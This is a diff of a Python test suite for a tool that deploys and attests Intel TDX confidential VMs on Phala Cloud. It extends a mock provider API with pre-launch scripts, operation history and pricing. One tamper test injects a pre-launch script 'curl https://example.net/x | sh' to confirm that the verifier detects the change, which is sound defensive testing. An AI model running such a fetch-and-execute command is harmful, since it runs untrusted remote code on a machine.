@@ -28,6 +28,7 @@ from tgwitness.verify import fingerprint
 
 INSTANCE = "07" * 20
 OS_IMAGE = "ab" * 32
+PHALA_PRE_LAUNCH = '#!/bin/bash\necho "Running Phala Cloud Pre-Launch Script v0.0.20"\ndocker compose pull\n'
 
 
 def archive_of(files, commit=COMMIT):
@@ -50,29 +51,44 @@ class PhalaWorld(World):
     def __init__(self):
         super().__init__()
         self.kms, self.cvm, self.revisions, self.env, self.app_compose = X25519PrivateKey.generate(), None, [], None, None
+        self.operations = []
 
     def provider(self, method, url, body, params, headers, data):
         assert headers["X-API-Key"] and headers["X-Phala-Version"] == API_VERSION and "Authorization" not in headers
         path = url[len(Phala.base):]
         if path == "/cvms" and method == "POST" and "compose_file" in body:
+            if "name" not in body["compose_file"]:
+                return Response(422, {"detail": [{"type": "missing", "loc": ["compose_file", "name"],
+                                                  "msg": "Field required"}]})
             self.name, self.provisioned = body["name"], body
-            self.app_compose = json.dumps({"manifest_version": 2, "name": body["name"], "runner": "docker-compose",
-                                           **body["compose_file"]}, sort_keys=True)
+            # Like Phala Cloud: its own pre-launch script unless an empty one is given, which is dropped.
+            fields = {"manifest_version": 2, "runner": "docker-compose", "features": ["kms"], "storage_fs": "zfs",
+                      "tproxy_enabled": False, **body["compose_file"]}
+            if fields.get("pre_launch_script") is None:
+                fields["pre_launch_script"] = PHALA_PRE_LAUNCH
+            elif fields["pre_launch_script"] == "":
+                del fields["pre_launch_script"]
+            self.app_compose = json.dumps(fields, sort_keys=True, separators=(",", ":"))
             self.compose_hash = hashlib.sha256(self.app_compose.encode()).hexdigest()
             self.app_id = self.compose_hash[:40]
+            # Without an image Phala Cloud picks the development build of its current release.
+            self.image = body.get("image", "dstack-dev-0.5.5")
             public = self.kms.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
             return Response(200, {"app_id": self.app_id, "app_env_encrypt_pubkey": public.hex(),
-                                  "compose_hash": self.compose_hash, "token": "commit-token"})
+                                  "compose_hash": self.compose_hash, "compose_file": self.app_compose,
+                                  "os_image_version": "0.5.5", "token": "commit-token"})
         if path == "/cvms" and method == "POST":
             assert body["token"] == "commit-token" and body["app_id"] == self.app_id
             sealed = bytes.fromhex(body["encrypted_env"])
             shared = self.kms.exchange(X25519PublicKey.from_public_bytes(sealed[:32]))
             self.env = {e["key"]: e["value"] for e in json.loads(AESGCM(shared).decrypt(sealed[32:44], sealed[44:], None))["env"]}
             assert sorted(self.env) == body["env_keys"]
-            self.cvm = {"id": "cvm-1", "name": self.name, "app_id": self.app_id, "instance_id": INSTANCE,
+            # Without the dstack gateway Phala Cloud never fills instance_id here; /state has it.
+            self.cvm = {"id": "cvm-1", "name": self.name, "app_id": self.app_id, "instance_id": None,
                         "status": "running", "compose_hash": self.compose_hash, "resource": {"instance_type": "tdx.small"},
-                        "os": {"version": "0.5.5", "is_dev": False, "os_image_hash": OS_IMAGE},
-                        "node_info": {"name": "node-1", "region": "us-west"}, "gateway_enabled": False, "endpoints": []}
+                        "os": {"version": "0.5.5", "is_dev": self.image.startswith("dstack-dev-"), "os_image_hash": OS_IMAGE},
+                        "node_info": {"name": "node-1", "region": "us-west"}, "gateway_enabled": False, "endpoints": [],
+                        "hourly_rate": {"total": "0.060780", "compute": "0.058000", "disk": "0.002780"}}
             self.revise("provision", self.compose_hash)
             return Response(200, {"id": "cvm-1", "created_at": CREATED, "app_id": self.app_id})
         if path == "/cvms/cvm-1" and method == "DELETE":
@@ -80,6 +96,8 @@ class PhalaWorld(World):
             return Response(204)
         if path == "/cvms/cvm-1":
             return Response(404, {"detail": "not found"}) if self.deleted else Response(200, self.cvm)
+        if path == "/cvms/cvm-1/state":
+            return Response(200, {"id": "vm-1", "instance_id": INSTANCE, "status": self.cvm["status"]})
         if path == "/cvms/paginated":
             items = [] if self.deleted or not self.cvm else [self.cvm]
             return Response(200, {"items": items, "total": len(items), "page": params["page"], "page_size": 100,
@@ -99,12 +117,26 @@ class PhalaWorld(World):
         if path == "/apps/" + self.app_id + "/revisions":
             return Response(200, {"revisions": self.revisions, "total": len(self.revisions), "page": params["page"],
                                   "page_size": 100, "total_pages": 1})
+        if path == "/cvms/cvm-1/operations":
+            # Phala Cloud lists restarts, stops and starts here, newest first, one cursor page at a time.
+            start = int(params.get("cursor") or 0)
+            page = self.operations[::-1][start:start + 1]
+            more = start + 1 < len(self.operations)
+            return Response(200, {"items": page, "next_cursor": str(start + 1) if more else None,
+                                  "total": len(self.operations)})
         raise AssertionError(method + " " + path)
 
     def revise(self, operation, compose_hash, when=CREATED):
         self.revisions.append({"revision_id": "r" + str(len(self.revisions) + 1), "app_id": self.app_id,
                                "vm_uuid": "vm-1", "compose_hash": compose_hash, "created_at": when,
                                "operation_type": operation, "triggered_by": {"username": "operator"}})
+        if operation == "provision":
+            self.operate("create", when)
+
+    def operate(self, operation, when):
+        self.operations.append({"correlation_id": "op" + str(len(self.operations) + 1), "operation_type": operation,
+                                "status": "completed", "started_at": when[:19], "completed_at": when[:19],
+                                "triggered_by_username": "operator"})
 
 
     def request(self, method, url, timeout=None, json=None, params=None, headers=None, data=None):
@@ -298,6 +330,9 @@ def test_deploy_creates_a_cvm_whose_secrets_never_leave_encrypted(phala):
     assert all(c["status"] in ("pass", "unavailable") for c in record["collector"]["attestation"])
     assert world.provisioned["compose_file"]["allowed_envs"] == list(cloud.PHALA_ENV)
     assert world.provisioned["compose_file"]["gateway_enabled"] is False and world.provisioned["listed"] is False
+    assert world.provisioned["compose_file"]["name"] == world.provisioned["name"]
+    assert "pre_launch_script" not in json.loads(world.app_compose)
+    assert world.provisioned["image"] == "dstack-0.5.5" and record["server"]["instance_id"] == INSTANCE
     panel_token = (out / "panel-token.txt").read_text()
     assert world.env == {"TGWITNESS_TOKEN": panel_token, "TGWITNESS_TUNNEL_TOKEN": world.tunnel["token"]}
     published = (out / "docker-compose.yaml").read_text()
@@ -321,11 +356,15 @@ def test_a_clean_deployment_passes_on_the_quote_alone(phala):
     assert {"tdx_binding", "tdx_quote", "tdx_compose_hash", "tdx_compose", "tdx_identity", "tdx_os"} <= found.keys()
     assert "binding" not in found and "cloud_init" not in found and "host_access" not in found
     markdown = cloud.render(report)
-    assert "checked by this verifier to Intel's root" in markdown and "--tdx-measurements" in markdown
+    assert "checked by this verifier to Intel's root" in markdown and "--tdx-measurements" not in markdown
     assert "Without hardware attestation" not in markdown and "Phala's KMS" in markdown
     assert phala.world.tunnel["token"] not in markdown + json.dumps(report)
+    attestation = report["attestation"]
+    assert attestation["quote"]["mrtd"] == Forge.measurements()["mrtd"].hex() and attestation["intel"]["status"] == "UpToDate"
+    assert attestation["identity"]["app_id"] == phala.world.app_id and attestation["certificates"][-1]["pinned_root"] is False
     report = verify(phala, tdx_measurements=None)
     assert report["result"] == "incomplete" and checks(report)["tdx_os"] == "unavailable"
+    assert "--tdx-image none" in detail(report, "tdx_os")
     assert report["assurance"]["key_nonexportability"] == "conditional-on-os-image"
     wrong = phala.tmp / "other-image.json"
     wrong.write_text(json.dumps({**{k: v.hex() for k, v in Forge.measurements().items()}, "rtmr2": "00" * 48}))
@@ -345,7 +384,7 @@ def test_every_substitution_the_quote_must_expose(phala):
     result = checks(verify(phala))
     assert result["tdx_compose_hash"] == "fail" and result["tdx_compose"] == "fail"
     cvm.compose_hash = None
-    for change in ({"pre_launch_script": "curl https://example.net/x | sh"},
+    for change in ({"pre_launch_script": "curl https://example.net/x | sh"}, {"pre_launch_script": PHALA_PRE_LAUNCH},
                    {"docker_compose_file": json.loads(world.app_compose)["docker_compose_file"].replace(
                        "--require-hashes", "--no-deps", 1)}):
         world.app_compose = json.dumps({**json.loads(world.app_compose), **change}, sort_keys=True)
@@ -364,8 +403,12 @@ def test_events_after_boot_another_instance_and_revisions_are_reported(phala):
     cvm.override = {"instance_id": "08" * 20}
     assert checks(verify(phala))["tdx_identity"] == "fail"
     cvm.override = {}
-    world.revise("restart", world.compose_hash, LATE)
-    assert checks(verify(phala))["provider_actions"] == "review"
+    assert checks(verify(phala))["provider_actions"] == "pass"
+    world.operate("restart", LATE)
+    world.operate("stop", LATE)
+    report = verify(phala)
+    assert checks(report)["provider_actions"] == "review"
+    assert sorted(a["command"] for a in report["provider_actions"] if a["assessment"] == "review") == ["restart", "stop"]
     world.revise("update", "22" * 32, LATE)
     report = verify(phala)
     assert checks(report)["provider_actions"] == "fail" and report["result"] == "fail"
@@ -471,7 +514,8 @@ def test_a_quick_tunnel_runs_in_the_measured_compose_and_posts_its_address_signe
     posted = {"host": "calm-words-here.trycloudflare.com", "posted": 1, "signed": True}
     out = tmp_path / "quick-deployment"
     record, out = cloud.deploy(quick(tmp_path, out=out), get("phala")("phala-key", session=world), None,
-                               cvm.fetch, resolve=lambda repository, ref: ref, beacon=lambda topic, key=None: posted,
+                               cvm.fetch, resolve=lambda repository, ref: ref,
+                               beacon=lambda topic, key=None, public_key=None: posted,
                                archive=lambda spec: ARCHIVE, collateral=lambda raw: json.loads(phala.collateral.read_text()),
                                progress=lambda stage, text: None)
     assert record["state"] == "running" and record["address"]["host"] == posted["host"] and "tunnel" not in record
@@ -483,11 +527,12 @@ def test_a_quick_tunnel_runs_in_the_measured_compose_and_posts_its_address_signe
                              source=ROOT, evidence=None, tdx_measurements=phala.measurements,
                              tdx_collateral=phala.collateral),
                           get("phala")("read-only", session=world), None, cvm.fetch,
-                          beacon=lambda topic, key=None: posted)
+                          beacon=lambda topic, key=None, public_key=None: posted)
     found = checks(report)
     assert all(found[c] == "pass" for c in ("tdx_binding", "tdx_quote", "tdx_compose_hash", "tdx_compose",
                                              "tdx_identity")), found
     assert report["assurance"]["independent_runtime_attestation"] == "intel-tdx"
+    assert found["tunnel"] == "pass" and "serves the panel from inside the CVM" in detail(report, "tunnel")
     assert cloud.PHALA_QUICK in report["does_not_establish"]
     assert not any("Cloudflare reports the tunnel" in text for text in report["establishes"])
     record, removed = cloud.destroy(NS(record=out / "deployment.json", confirm="case-1", provider_token_file=None,
@@ -524,7 +569,7 @@ def test_the_panel_wizard_prices_deploys_and_deletes_a_phala_cvm(phala, tmp_path
     monkeypatch.setattr(Phala, "attest", staticmethod(cvm.attest))
     posted = {"host": "calm-words-here.trycloudflare.com", "posted": 1, "signed": True}
     jobs = cloud_wizard.Jobs(tmp_path / "panel", session=world, fetch=cvm.fetch,
-                             beacon=lambda topic, key=None: posted,
+                             beacon=lambda topic, key=None, public_key=None: posted,
                              collateral=lambda raw: json.loads(phala.collateral.read_text()))
     jobs.deploy(cloud_wizard.Deploy(provider="phala", phala_token=key, location="any", server_type="tdx.small",
                                     name="cvm-1"))
@@ -538,6 +583,7 @@ def test_the_panel_wizard_prices_deploys_and_deletes_a_phala_cvm(phala, tmp_path
     assert any(line["text"].startswith("[PASS] Intel vouches for the quote") for line in job["lines"]), job["lines"]
     listed = jobs.status()["deployments"]
     assert listed[0]["attested"] is True and listed[0]["provider"] == "phala"
+    assert listed[0]["price"] == {"monthly": "44.37", "hourly": "0.06078", "currency": "USD"}
     path, media = jobs.file("cvm-1", "docker-compose.yaml")
     assert path.read_text() == json.loads(world.app_compose)["docker_compose_file"]
     for secret in (key, (tmp_path / "panel/deployments/cvm-1/panel-token.txt").read_text()):
@@ -568,7 +614,8 @@ def test_the_wizard_in_the_browser_offers_deploys_and_deletes_a_phala_cvm(phala,
     key, errors = "phak_" + "k" * 32, []
     with RunningApp(tmp_path / "panel") as server, sync_playwright() as p:
         jobs = server.app.state.cloud_jobs
-        jobs.session, jobs.fetch, jobs.beacon = world, cvm.fetch, lambda topic, key=None: posted
+        jobs.session, jobs.fetch = world, cvm.fetch
+        jobs.beacon = lambda topic, key=None, public_key=None: posted
         jobs.collateral = lambda raw: json.loads(phala.collateral.read_text())
         browser = launch_browser(p)
         context = browser.new_context(viewport={"width": 1280, "height": 1000}, reduced_motion="reduce")
@@ -602,6 +649,7 @@ def test_the_wizard_in_the_browser_offers_deploys_and_deletes_a_phala_cvm(phala,
         page.locator("#cloud-servers").evaluate("details => details.open = true")
         row = page.locator(".cloud-server", has_text=name)
         expect(row).to_contain_text("Intel TDX confidential virtual machine at Phala Cloud")
+        expect(row).to_contain_text("44.37 USD a month (0.06078 USD an hour), billed by Phala Cloud")
         row.get_by_role("button", name="Delete the server").click()
         answer_panel_dialog(page, text=name)
         expect(page.locator("#cloud-job-title")).to_have_text("The server is deleted", timeout=30000)
